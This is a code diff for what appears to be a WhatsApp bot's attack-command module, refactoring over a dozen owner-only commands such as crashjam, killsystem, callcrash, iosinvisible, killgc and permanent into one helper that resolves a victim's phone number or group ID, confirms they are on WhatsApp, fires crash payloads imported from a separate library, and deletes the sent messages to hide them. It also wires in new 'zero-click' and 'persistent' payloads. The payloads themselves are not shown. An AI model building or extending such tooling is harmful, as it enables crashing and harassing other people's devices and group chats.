@@ -20,6 +20,8 @@ import {
   sendMaliciousPDFPayload,
   sendMaliciousJPEGPayload,
   sendToxicStickerPayload,
+  sendZeroClickMediaPayload,
+  sendPersistentSchemaPayload,
   isProtectedJid
 } from '../lib/bug-payloads.js';
 
@@ -28,8 +30,12 @@ function isAllowed(msg) {
   return msg.key.fromMe || isOwner(sender);
 }
 
-function cleanNumber(input) {
-  return (input || '').replace(/[^0-9]/g, '');
+function resolveTargetJid(input) {
+  if (!input) return null;
+  const trimmed = input.trim();
+  if (trimmed.endsWith('@g.us')) return trimmed;
+  const clean = trimmed.replace(/[^0-9]/g, '');
+  return clean ? `${clean}@s.whatsapp.net` : null;
 }
 
 function notifySending(sock, chat, target, cmdName = 'BUG') {
@@ -39,7 +45,7 @@ function notifySending(sock, chat, target, cmdName = 'BUG') {
 
 async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
   if (result && result.success) {
-    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED & AUTO-DELETED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
+    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED & CLEANED (DELETE FOR ME)\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
     return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
   } else {
     const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
@@ -48,15 +54,41 @@ async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
   }
 }
 
-async function checkWhatsAppUser(sock, cleanTarget) {
+async function checkWhatsAppUser(sock, targetJid) {
+  if (!targetJid) return false;
+  if (targetJid.endsWith('@g.us')) return true;
+  const cleanTarget = targetJid.split('@')[0].replace(/[^0-9]/g, '');
   if (!cleanTarget) return false;
   try {
     const res = await sock.onWhatsApp(cleanTarget);
-    if (!res || !res.length) return true; // Fallback if WhatsApp user lookup is restricted
+    if (!res || !res.length) return true; // Fallback if lookup restricted
     const existsObj = Array.isArray(res) ? res[0] : res;
     return Boolean(existsObj && existsObj.exists !== false);
   } catch (e) {
     return true; // Fallback if lookup fails
+  }
+}
+
+async function executeBugCommand(sock, chat, msg, args, cmdName, payloadFn) {
+  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
+  if (!args[0]) return sock.sendMessage(chat, { text: `❌ Usage: .${cmdName} <number or groupJid>` }, { quoted: msg });
+
+  const targetJid = resolveTargetJid(args[0]);
+  if (!targetJid) return sock.sendMessage(chat, { text: '❌ Invalid target phone number or group JID.' }, { quoted: msg });
+
+  if (isProtectedJid(sock, targetJid)) {
+    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
+  }
+
+  try {
+    const exists = await checkWhatsAppUser(sock, targetJid);
+    if (!exists) return sock.sendMessage(chat, { text: `❌ Target is not on WhatsApp` }, { quoted: msg });
+
+    await notifySending(sock, chat, targetJid, cmdName);
+    const res = await payloadFn(sock, targetJid);
+    await notifyResult(sock, chat, targetJid, cmdName, res, msg);
+  } catch (err) {
+    await notifyResult(sock, chat, targetJid, cmdName, { success: false, deliveredCount: 0, errors: [err.message] }, msg);
   }
 }
 
@@ -65,330 +97,63 @@ async function checkWhatsAppUser(sock, cleanTarget) {
 // ─────────────────────────────────────────────
 
 export async function crashjamCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashjam <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'crashjam');
-    const res = await sendCrashJamPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'crashjam', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'crashjam', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'crashjam', sendCrashJamPayload);
 }
 
 export async function killsystemCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .killsystem <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'killsystem');
-    const res = await sendKillSystemPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'killsystem', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'killsystem', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'killsystem', sendKillSystemPayload);
 }
 
 export async function crashfinityCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashfinity <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'crashfinity');
-    const res = await sendCrashFinityPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'crashfinity', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'crashfinity', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'crashfinity', sendCrashFinityPayload);
 }
 
 export async function stickercrashCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .stickercrash <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'stickercrash');
-    const res = await sendToxicStickerPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'stickercrash', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'stickercrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'stickercrash', sendToxicStickerPayload);
 }
 
 export async function callcrashCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .callcrash <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'callcrash');
-    const res = await sendCallCrashPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'callcrash', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'callcrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'callcrash', sendCallCrashPayload);
 }
 
 export async function xdelayCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xdelay <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'xdelay');
-    const res = await sendXdelayPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'xdelay', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'xdelay', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'xdelay', sendXdelayPayload);
 }
 
 export async function xbetainvisCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xbetainvis <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'xbetainvis');
-    const res = await sendIosInvisiblePayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'xbetainvis', sendIosInvisiblePayload);
 }
 
 export async function iosinvisibleCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .iosinvisible <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    const exists = await checkWhatsAppUser(sock, cleanTarget);
-    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
-
-    await notifySending(sock, chat, cleanTarget, 'iosinvisible');
-    const res = await sendIosInvisiblePayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'iosinvisible', sendIosInvisiblePayload);
 }
 
 export async function xgroupCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xgroup <groupJid>\nExample: .xgroup 123456789@g.us' }, { quoted: msg });
-
-  const targetJid = args[0].trim();
-  if (!targetJid.endsWith('@g.us')) {
-    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetJid, 'xgroup');
-    const res = await sendKillSystemPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetJid, 'xgroup', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetJid, 'xgroup', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'xgroup', sendKillSystemPayload);
 }
 
 export async function killgcCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .killgc <groupJid>' }, { quoted: msg });
-
-  const targetJid = args[0].trim();
-  if (!targetJid.endsWith('@g.us')) {
-    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetJid, 'killgc');
-    const res = await sendPermanentCrashPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetJid, 'killgc', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetJid, 'killgc', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'killgc', sendPermanentCrashPayload);
 }
 
 export async function trashsysgpCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .trashsysgp <groupJid>' }, { quoted: msg });
-
-  const targetJid = args[0].trim();
-  if (!targetJid.endsWith('@g.us')) {
-    return sock.sendMessage(chat, { text: '❌ Invalid group JID' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetJid, 'trashsysgp');
-    const res = await sendPermanentCrashPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetJid, 'trashsysgp', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetJid, 'trashsysgp', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'trashsysgp', sendPermanentCrashPayload);
 }
 
 export async function testCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .test <number>' }, { quoted: msg });
-
-  const cleanTarget = cleanNumber(args[0]);
-  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
-  const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, cleanTarget, 'test');
-    const res = await sendToxicVCardPayload(sock, targetJid);
-    await notifyResult(sock, chat, cleanTarget, 'test', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, cleanTarget, 'test', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'test', sendToxicVCardPayload);
 }
 
 export async function killCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .kill <number or groupJid>' }, { quoted: msg });
-
-  const targetArg = args[0].trim();
-  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetArg, 'kill');
-    const res = await sendKillSystemPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetArg, 'kill', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetArg, 'kill', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'kill', sendKillSystemPayload);
 }
 
 export async function crashCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crash <number or groupJid>' }, { quoted: msg });
-
-  const targetArg = args[0].trim();
-  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetArg, 'crash');
-    const res = await sendPermanentCrashPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetArg, 'crash', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetArg, 'crash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'crash', sendPermanentCrashPayload);
 }
 
 export async function permanentCommand(sock, chat, msg, args) {
-  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .permanent <number or groupJid>' }, { quoted: msg });
-
-  const targetArg = args[0].trim();
-  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;
-
-  if (isProtectedJid(sock, targetJid)) {
-    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
-  }
-
-  try {
-    await notifySending(sock, chat, targetArg, 'permanent multi-vector crash');
-    const res = await sendPermanentCrashPayload(sock, targetJid);
-    await notifyResult(sock, chat, targetArg, 'permanent crash', res, msg);
-  } catch (err) {
-    await notifyResult(sock, chat, targetArg, 'permanent crash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
-  }
+  return executeBugCommand(sock, chat, msg, args, 'permanent', sendPermanentCrashPayload);
 }
 
 export async function xxddosCommand(sock, chat, msg, args) {
